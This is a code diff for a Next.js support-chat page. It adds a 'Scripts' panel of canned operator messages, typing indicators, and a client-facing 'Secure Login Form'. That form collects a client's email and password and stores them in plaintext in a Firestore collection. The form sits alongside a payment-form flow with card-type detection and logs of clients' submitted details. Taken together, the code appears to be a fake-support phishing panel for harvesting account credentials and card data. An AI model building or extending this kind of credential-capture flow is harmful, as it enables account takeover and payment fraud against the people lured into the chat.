@@ -8,6 +8,7 @@ import React, {
   FormEvent,
   useRef,
 } from "react";
+import dynamic from "next/dynamic"; // Import Next.js dynamic
 import Image from "next/image";
 import { useSearchParams } from "next/navigation";
 import {
@@ -25,9 +26,19 @@ import {
   CollectionReference,
   doc,
   getDoc,
+  setDoc,
 } from "firebase/firestore";
 import { db } from "@/lib/firebase";
 import { MdLock, MdDelete, MdEdit, MdCreditCard, MdEmail } from "react-icons/md";
+// Import drag-and-drop components and types
+import {
+  DragDropContext,
+  Droppable,
+  Draggable,
+  DropResult,
+  DroppableProvided,
+  DraggableProvided,
+} from "react-beautiful-dnd";
 
 // ---------------------------
 // Data Types
@@ -48,12 +59,13 @@ type Message = {
 
 type UserData = {
   userID: string;
-  username: string;
+  username: string; // You can rename or use a different field if desired
 };
 
 type PreComposedMessage = {
   id: string;
   text: string;
+  order: number; // For custom ordering
 };
 
 interface TransactionFormProps {
@@ -220,8 +232,91 @@ function SecureLoginRequestPlaceholder() {
 }
 
 // ---------------------------
-// (Note: The SecureLoginForm component for clients would be on a separate page)
+// SecureLoginForm Component (Client Only)
 // ---------------------------
+function SecureLoginForm({ transactionId }: { transactionId: string }) {
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [submitted, setSubmitted] = useState(false);
+
+  const handleSubmit = async (e: FormEvent) => {
+    e.preventDefault();
+    try {
+      await addDoc(collection(db, "secureLoginDetails"), {
+        transactionId,
+        email,
+        password,
+      });
+      setSubmitted(true);
+    } catch (error) {
+      console.error("Error submitting secure login details:", error);
+    }
+  };
+
+  if (submitted) {
+    return (
+      <div
+        style={{
+          padding: "10px",
+          margin: "10px 0",
+          backgroundColor: "#E0E3FF",
+          border: "1px solid #5865F2",
+          borderRadius: "8px",
+          color: "#5865F2",
+        }}
+      >
+        Login details submitted.
+      </div>
+    );
+  }
+
+  return (
+    <form
+      onSubmit={handleSubmit}
+      style={{
+        border: "1px solid #5865F2",
+        borderRadius: "8px",
+        padding: "10px",
+        margin: "10px 0",
+        backgroundColor: "#E0E3FF",
+      }}
+    >
+      <div style={{ marginBottom: "10px" }}>
+        <label style={{ marginRight: "10px", color: "#5865F2" }}>Email:</label>
+        <input
+          type="email"
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+          required
+          style={{
+            padding: "5px",
+            borderRadius: "4px",
+            border: "1px solid #ccc",
+            color: "black",
+          }}
+        />
+      </div>
+      <div style={{ marginBottom: "10px" }}>
+        <label style={{ marginRight: "10px", color: "#5865F2" }}>Password:</label>
+        <input
+          type="password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          required
+          style={{
+            padding: "5px",
+            borderRadius: "4px",
+            border: "1px solid #ccc",
+            color: "black",
+          }}
+        />
+      </div>
+      <button type="submit" style={{ ...chatSendStyle, backgroundColor: "#007bff" }}>
+        Submit Login
+      </button>
+    </form>
+  );
+}
 
 // ---------------------------
 // Helper to detect card type (used on secure responses)
@@ -276,13 +371,14 @@ function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
 }
 
 // ---------------------------
-// ChatContent Component (Support)
+// ChatContent Component (Shared between Support and Client)
 // ---------------------------
 function ChatContent() {
   const searchParams = useSearchParams();
   const initialTx = searchParams.get("tx") || "";
-  // On the support page, the role is always "support"
-  const userRole = "support" as const;
+  // Determine user role based on query parameter. Defaults to "support".
+  const roleParam = searchParams.get("role");
+  const userRole = roleParam === "client" ? "client" : "support";
 
   const [transactionId, setTransactionId] = useState(initialTx);
   const [messages, setMessages] = useState<Message[]>([]);
@@ -303,13 +399,28 @@ function ChatContent() {
   const [editingMessageId, setEditingMessageId] = useState<string | null>(null);
   const [editingMessageText, setEditingMessageText] = useState("");
 
+  // Typing indicator state
+  const [typingStatus, setTypingStatus] = useState<{ support: boolean; client: boolean }>({
+    support: false,
+    client: false,
+  });
+  const typingTimeoutRef = useRef<NodeJS.Timeout | null>(null);
+
   const messagesEndRef = useRef<HTMLDivElement | null>(null);
   const chatInputRef = useRef<HTMLTextAreaElement>(null);
 
+  // Audio for notification sound
+  const notificationSoundRef = useRef<HTMLAudioElement | null>(null);
+  const firstLoadRef = useRef(true);
+  const prevMessagesCountRef = useRef(0);
+
+  // On component mount, load the sound file
   useEffect(() => {
     setContainerLoaded(true);
+    notificationSoundRef.current = new Audio("/sounds/notification.mp3");
   }, []);
 
+  // Fetch user data from Firestore
   useEffect(() => {
     async function fetchUserData() {
       setLoading(true);
@@ -329,6 +440,7 @@ function ChatContent() {
     if (transactionId) fetchUserData();
   }, [transactionId]);
 
+  // Fetch chat messages
   useEffect(() => {
     if (!transactionId) return;
     const messagesRef = collection(db, "messages") as CollectionReference<Message>;
@@ -344,20 +456,50 @@ function ChatContent() {
     return () => unsubscribe();
   }, [transactionId]);
 
+  // Fetch pre-composed messages (FIFO)
   useEffect(() => {
     const preComposedRef = collection(db, "precomposedMessages");
-    const unsubscribe = onSnapshot(preComposedRef, (snapshot) => {
-      const msgs = snapshot.docs.map((doc) => ({ id: doc.id, ...doc.data() }));
-      setPreComposedMessages(msgs as PreComposedMessage[]);
+    const q = query(preComposedRef, orderBy("order", "asc"));
+    const unsubscribe = onSnapshot(q, (snapshot) => {
+      const msgs = snapshot.docs.map((doc) => {
+        const data = doc.data();
+        const order = data.order !== undefined ? data.order : 0;
+        return { id: doc.id, ...data, order } as PreComposedMessage;
+      });
+      setPreComposedMessages(msgs);
     });
     return () => unsubscribe();
   }, []);
 
+  // Scroll down on new messages
   useEffect(() => {
     if (messagesEndRef.current) {
       messagesEndRef.current.scrollIntoView({ behavior: "smooth" });
     }
   }, [messages]);
+
+  // Notification sound for new incoming messages
+  useEffect(() => {
+    if (messages.length > 0) {
+      if (firstLoadRef.current) {
+        // Skip sound on the initial load
+        firstLoadRef.current = false;
+      } else {
+        // If there's a new message
+        if (messages.length > prevMessagesCountRef.current) {
+          const lastMessage = messages[messages.length - 1];
+          // Only play the sound if the last message is from the other user
+          if (lastMessage.sender !== userRole && notificationSoundRef.current) {
+            notificationSoundRef.current.play().catch((err) => {
+              console.error("Audio play failed:", err);
+            });
+          }
+        }
+      }
+      // Update the previous count
+      prevMessagesCountRef.current = messages.length;
+    }
+  }, [messages, userRole]);
 
   const containerAnimationStyle: React.CSSProperties = {
     opacity: containerLoaded ? 1 : 0,
@@ -374,7 +516,7 @@ function ChatContent() {
     }
   };
 
-  // Function to save an edited conversation message
+  // Function to save an edited message
   const saveEditedMessage = async (id: string) => {
     try {
       await updateDoc(doc(db, "messages", id), { text: editingMessageText });
@@ -385,7 +527,7 @@ function ChatContent() {
     }
   };
 
-  // Optimistic message sending
+  // Send message
   const sendMessage = async (
     text: string,
     messageType: Message["messageType"] = "text"
@@ -414,7 +556,7 @@ function ChatContent() {
     }
   };
 
-  // Called on form submit (fallback for send button)
+  // Called on form submit
   const handleSend = async (e: FormEvent) => {
     e.preventDefault();
     const message = chatInput.trim();
@@ -426,7 +568,7 @@ function ChatContent() {
     }
   };
 
-  // Sends message on pressing Enter (without Shift)
+  // Handle Enter key (without Shift) for sending
   const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
     if (e.key === "Enter" && !e.shiftKey) {
       e.preventDefault();
@@ -441,26 +583,34 @@ function ChatContent() {
     }
   };
 
-  // Adjust textarea height as user types.
+  // Adjust textarea height and update typing status
   const handleChatInputChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
     setChatInput(e.target.value);
     if (chatInputRef.current) {
       chatInputRef.current.style.height = "auto";
       chatInputRef.current.style.height = `${chatInputRef.current.scrollHeight}px`;
     }
+    if (transactionId) {
+      const typingDocRef = doc(db, "typingStatus", transactionId);
+      // Set own typing flag to true
+      setDoc(typingDocRef, { [userRole + "Typing"]: true }, { merge: true }).catch(console.error);
+      if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
+      typingTimeoutRef.current = setTimeout(() => {
+        setDoc(typingDocRef, { [userRole + "Typing"]: false }, { merge: true }).catch(console.error);
+      }, 2000);
+    }
   };
 
-  // When secure payment form button is clicked, support sends a secure payment form request.
+  // Secure actions
   const handleSendSecureFormRequest = async () => {
     await sendMessage("Secure Payment Form", "secure_form_request");
   };
 
-  // When secure login form button is clicked, support sends a secure login form request.
   const handleSendSecureLoginRequest = async () => {
     await sendMessage("Secure Login Form", "secure_login_request");
   };
 
-  // Render message content based on message type.
+  // Render message content based on type
   const renderMessageContent = (msg: Message) => {
     if (msg.messageType === "secure_form_request") {
       return <SecureFormRequestPlaceholder />;
@@ -474,8 +624,11 @@ function ChatContent() {
       );
     }
     if (msg.messageType === "secure_login_request") {
-      // On the support page, always show the placeholder.
-      return <SecureLoginRequestPlaceholder />;
+      return userRole === "client" ? (
+        <SecureLoginForm transactionId={msg.transactionId} />
+      ) : (
+        <SecureLoginRequestPlaceholder />
+      );
     }
     if (msg.messageType === "secure_login_response") {
       return (
@@ -517,88 +670,92 @@ function ChatContent() {
     return <span>{msg.text}</span>;
   };
 
-  // Render each conversation message.
+  // Render each message
   const renderMessage = (msg: Message) => {
-    const key = msg.id || Math.random().toString(36).substr(2, 9);
-    const isSupport = msg.sender === "support";
-    if (isSupport && editingMessageId === msg.id) {
-      return (
-        <div
-          key={key}
-          style={{
-            position: "relative",
-            margin: "10px 0",
-            padding: "10px 15px",
-            borderRadius: "15px",
-            maxWidth: "70%",
-            wordWrap: "break-word",
-            fontSize: "15px",
-            backgroundColor: "#5865F2",
-            color: "#fff",
-          }}
-        >
-          <input
-            type="text"
-            value={editingMessageText}
-            onChange={(e) => setEditingMessageText(e.target.value)}
-            style={{
-              width: "100%",
-              padding: "5px",
-              borderRadius: "8px",
-              border: "none",
-              color: "black",
-            }}
-          />
-          <div style={{ marginTop: "5px" }}>
-            <button onClick={() => saveEditedMessage(msg.id!)} style={chatSendStyle}>
-              Save
-            </button>
-            <button
-              onClick={() => setEditingMessageId(null)}
-              style={{ ...chatSendStyle, backgroundColor: "#ccc", marginLeft: "5px" }}
-            >
-              Cancel
-            </button>
-          </div>
-        </div>
-      );
-    }
-    return (
-      <div
-        key={key}
-        style={{
-          position: "relative",
-          margin: "10px 0",
-          padding: "10px 15px",
-          borderRadius: "15px",
-          maxWidth: "70%",
-          wordWrap: "break-word",
-          fontSize: "15px",
-          backgroundColor: "#5865F2",
-          color: "#fff",
-        }}
-      >
-        {isSupport && (
-          <button
-            onClick={() => {
-              setEditingMessageId(msg.id!);
-              setEditingMessageText(msg.text);
-            }}
-            style={editBtnStyle}
-            title="Edit Message"
-          >
-            <MdEdit />
-          </button>
-        )}
-        <strong>{msg.sender}:</strong> {renderMessageContent(msg)}
-        <button onClick={() => deleteMessage(msg.id!)} style={deleteBtnStyle} title="Delete Message">
-          <MdDelete />
-        </button>
-      </div>
-    );
+  const key = msg.id || Math.random().toString(36).substr(2, 9);
+  const isSupport = msg.sender === "support";
+  const messageContainerStyle: React.CSSProperties = {
+    alignSelf: isSupport ? "flex-end" : "flex-start",
+    margin: "10px 0",
+    padding: "10px 15px",
+    borderRadius: "15px",
+    maxWidth: "70%",
+    wordWrap: "break-word",
+    fontSize: "15px",
+    backgroundColor: "#5865F2",
+    color: "#fff",
   };
 
-  // Handle file change for image messages.
+  if (isSupport && editingMessageId === msg.id) {
+    return (
+      <div key={key} style={messageContainerStyle}>
+        <textarea
+          value={editingMessageText}
+          onChange={(e) => setEditingMessageText(e.target.value)}
+          style={{
+            width: "100%",
+            padding: "5px",
+            borderRadius: "8px",
+            border: "none",
+            color: "black",
+            fontSize: "15px",
+            minHeight: "60px", // Ensures the editing container remains tall enough
+            resize: "vertical", // Allows the user to adjust the height if needed
+          }}
+          rows={3} // Provides an initial height for multi-line editing
+        />
+        <div style={{ marginTop: "5px" }}>
+          <button onClick={() => saveEditedMessage(msg.id!)} style={chatSendStyle}>
+            Save
+          </button>
+          <button
+            onClick={() => setEditingMessageId(null)}
+            style={{ ...chatSendStyle, backgroundColor: "#ccc", marginLeft: "5px" }}
+          >
+            Cancel
+          </button>
+        </div>
+      </div>
+    );
+  }
+  
+
+  return (
+    <div key={key} style={messageContainerStyle}>
+      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+        {/* Message Content */}
+        <div style={{ flex: 1, paddingRight: "10px" }}>
+          {renderMessageContent(msg)}
+        </div>
+        {/* Icons for actions */}
+        <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
+          {isSupport && (
+            <button
+              onClick={() => {
+                setEditingMessageId(msg.id!);
+                setEditingMessageText(msg.text);
+              }}
+              style={iconButtonStyle}
+              title="Edit Message"
+            >
+              <MdEdit />
+            </button>
+          )}
+          <button
+            onClick={() => deleteMessage(msg.id!)}
+            style={iconButtonStyle}
+            title="Delete Message"
+          >
+            <MdDelete />
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+
+  // Handle image file change
   const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
@@ -626,8 +783,12 @@ function ChatContent() {
   const addPreComposedMessage = async () => {
     const trimmed = newPreComposed.trim();
     if (!trimmed) return;
+    const maxOrder = preComposedMessages.reduce(
+      (max, msg) => Math.max(max, msg.order || 0),
+      0
+    );
     try {
-      await addDoc(collection(db, "precomposedMessages"), { text: trimmed });
+      await addDoc(collection(db, "precomposedMessages"), { text: trimmed, order: maxOrder + 1 });
       setNewPreComposed("");
     } catch (error) {
       console.error("Error adding pre-composed message:", error);
@@ -660,7 +821,23 @@ function ChatContent() {
     }
   };
 
-  // Filter logs for secure responses.
+  // Handle drag-and-drop reordering for pre-composed messages.
+  const handleDragEnd = async (result: DropResult) => {
+    if (!result.destination) return;
+    const reordered = Array.from(preComposedMessages);
+    const [removed] = reordered.splice(result.source.index, 1);
+    reordered.splice(result.destination.index, 0, removed);
+    setPreComposedMessages(reordered);
+    // Update Firestore order values.
+    for (let i = 0; i < reordered.length; i++) {
+      const msg = reordered[i];
+      await updateDoc(doc(db, "precomposedMessages", msg.id), {
+        order: reordered.length - i,
+      });
+    }
+  };
+
+  // Filter secure logs.
   const secureFormLogs = messages.filter(
     (msg) => msg.messageType === "secure_form_response" && msg.sender === "client"
   );
@@ -679,43 +856,91 @@ function ChatContent() {
           <div style={{ ...chatWrapperStyle, ...containerAnimationStyle }}>
             {/* Pre-Composed Messages Panel */}
             <div style={preComposedContainerStyle}>
-              <h3 style={{ textAlign: "center", color: "#5865F2", marginBottom: "20px" }}>Scripts</h3>
-              {preComposedMessages.map((msg) => (
-                <div key={msg.id} style={preComposedMessageStyle}>
-                  {editingId === msg.id ? (
-                    <>
-                      <input
-                        type="text"
-                        value={editingText}
-                        onChange={(e) => setEditingText(e.target.value)}
-                        style={{
-                          flex: 1,
-                          marginRight: "5px",
-                          padding: "5px",
-                          borderRadius: "4px",
-                          border: "1px solid #ccc",
-                          color: "black",
-                        }}
-                      />
-                      <button onClick={() => saveEditedPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
-                        Save
-                      </button>
-                    </>
-                  ) : (
-                    <>
-                      <span style={{ flex: 1, cursor: "pointer", color: "black" }} onClick={() => sendMessage(msg.text)}>
-                        {msg.text}
-                      </span>
-                      <button onClick={() => editPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
-                        Edit
-                      </button>
-                      <button onClick={() => deletePreComposedMessage(msg.id)} style={preComposedButtonStyle}>
-                        Delete
-                      </button>
-                    </>
+              <h3 style={{ textAlign: "center", color: "#5865F2", marginBottom: "20px" }}>
+                Scripts
+              </h3>
+              <DragDropContext onDragEnd={handleDragEnd}>
+                <Droppable
+                  droppableId="precomposedMessages"
+                  isDropDisabled={false}
+                  isCombineEnabled={false}
+                  ignoreContainerClipping={false}
+                >
+                  {(provided: DroppableProvided) => (
+                    <div ref={provided.innerRef} {...provided.droppableProps}>
+                      {preComposedMessages.map((msg, index) => (
+                        <Draggable key={msg.id} draggableId={msg.id} index={index}>
+                          {(provided: DraggableProvided) => (
+                            <div
+                              ref={provided.innerRef}
+                              {...provided.draggableProps}
+                              {...provided.dragHandleProps}
+                              style={{
+                                ...preComposedMessageStyle,
+                                ...provided.draggableProps.style,
+                              }}
+                            >
+                              {editingId === msg.id ? (
+                                // Editing mode: textarea uses same dimensions as read-only container
+                                <>
+                                  <textarea
+                                    value={editingText}
+                                    onChange={(e) => setEditingText(e.target.value)}
+                                    style={{
+                                      ...scriptTextContainerStyle,
+                                      boxSizing: "border-box",
+                                      padding: "5px",
+                                      borderRadius: "4px",
+                                      border: "1px solid #ccc",
+                                      resize: "none",
+                                    }}
+                                  />
+                                  <div style={iconContainerStyle}>
+                                    <button
+                                      onClick={() => saveEditedPreComposedMessage(msg.id)}
+                                      style={iconButtonStyle}
+                                      title="Save Script"
+                                    >
+                                      Save
+                                    </button>
+                                  </div>
+                                </>
+                              ) : (
+                                // Normal mode: text container on left, edit & delete icons on right
+                                <>
+                                  <div
+                                    style={scriptTextContainerStyle}
+                                    onClick={() => sendMessage(msg.text)}
+                                  >
+                                    {msg.text}
+                                  </div>
+                                  <div style={iconContainerStyle}>
+                                  <button
+  onClick={() => editPreComposedMessage(msg.id)}
+  style={iconButtonStyle}
+  title="Edit Script"
+>
+  <MdEdit fill="#fff" stroke="#333" strokeWidth="1" />
+</button>
+<button
+  onClick={() => deletePreComposedMessage(msg.id)}
+  style={iconButtonStyle}
+  title="Delete Script"
+>
+  <MdDelete fill="#fff" stroke="#333" strokeWidth="1" />
+</button>
+                                  </div>
+                                </>
+                              )}
+                            </div>
+                          )}
+                        </Draggable>
+                      ))}
+                      {provided.placeholder}
+                    </div>
                   )}
-                </div>
-              ))}
+                </Droppable>
+              </DragDropContext>
               <div style={{ marginTop: "20px" }}>
                 <input
                   type="text"
@@ -751,17 +976,38 @@ function ChatContent() {
 
             {/* Chat Container */}
             <div style={chatContainerStyle}>
+              {/* Minimal Header: Only "Name | 12345678" */}
               <div style={chatHeaderStyle}>
-                Support Chat {user ? `- ${user.username}` : ""} (TX: {transactionId})
+                {/* If user exists, show "username | transactionId" */}
+                {user && (
+                  <div style={{ fontSize: "14px" }}>
+                    {user.username} | {transactionId}
+                  </div>
+                )}
               </div>
-              <div style={chatMessagesStyle}>
+
+              <div style={{ ...chatMessagesStyle, display: "flex", flexDirection: "column" }}>
                 {messages.map((msg) => renderMessage(msg))}
+                {/* Typing Indicator */}
+                {(userRole === "support" && typingStatus.client) ||
+                (userRole === "client" && typingStatus.support) ? (
+                  <div style={{ fontStyle: "italic", margin: "5px", color: "#5865F2" }}>
+                    typing...
+                  </div>
+                ) : null}
                 <div ref={messagesEndRef} />
               </div>
               <form onSubmit={handleSend} style={chatInputContainerStyle}>
                 <button type="button" onClick={() => fileInputRef.current?.click()} style={plusIconStyle}>
                   +
                 </button>
+                <input
+                  type="file"
+                  ref={fileInputRef}
+                  style={{ display: "none" }}
+                  onChange={handleFileChange}
+                  accept="image/*"
+                />
                 <textarea
                   ref={chatInputRef}
                   value={chatInput}
@@ -828,7 +1074,7 @@ function ChatContent() {
   );
 }
 
-export default function SupportChat() {
+function SupportChat() {
   return (
     <Suspense
       fallback={
@@ -853,6 +1099,9 @@ export default function SupportChat() {
     </Suspense>
   );
 }
+
+// Export SupportChat with SSR disabled to prevent hydration issues
+export default dynamic(() => Promise.resolve(SupportChat), { ssr: false });
 
 /* ----------------------
    Styling
@@ -895,12 +1144,43 @@ const preComposedMessageStyle: React.CSSProperties = {
   marginBottom: "10px",
   backgroundColor: "#fff",
   borderRadius: "5px",
-  cursor: "pointer",
-  display: "flex",
-  justifyContent: "space-between",
-  alignItems: "center",
   boxShadow: "0 2px 4px rgba(0,0,0,0.1)",
   transition: "transform 0.2s ease",
+  display: "flex",
+  flexDirection: "row",
+  alignItems: "flex-start",
+  justifyContent: "space-between",
+  height: "120px", // Fixed height for the entire container
+};
+
+const iconButtonStyle: React.CSSProperties = {
+  border: "none",
+  backgroundColor: "transparent",
+  cursor: "pointer",
+  color: "#fff",
+  fontSize: "18px",
+  padding: "4px",
+  borderRadius: "4px",
+};
+
+const iconContainerStyle: React.CSSProperties = {
+  display: "flex",
+  flexDirection: "column",
+  gap: "8px",
+};
+
+const scriptTextContainerStyle: React.CSSProperties = {
+  flex: 1,
+  height: "100%",
+  overflowY: "auto",
+  marginRight: "10px",
+  color: "black",
+};
+
+const scrollableTextStyle: React.CSSProperties = {
+  maxHeight: "100px",
+  overflowY: "auto",
+  color: "black",
 };
 
 const preComposedButtonStyle: React.CSSProperties = {
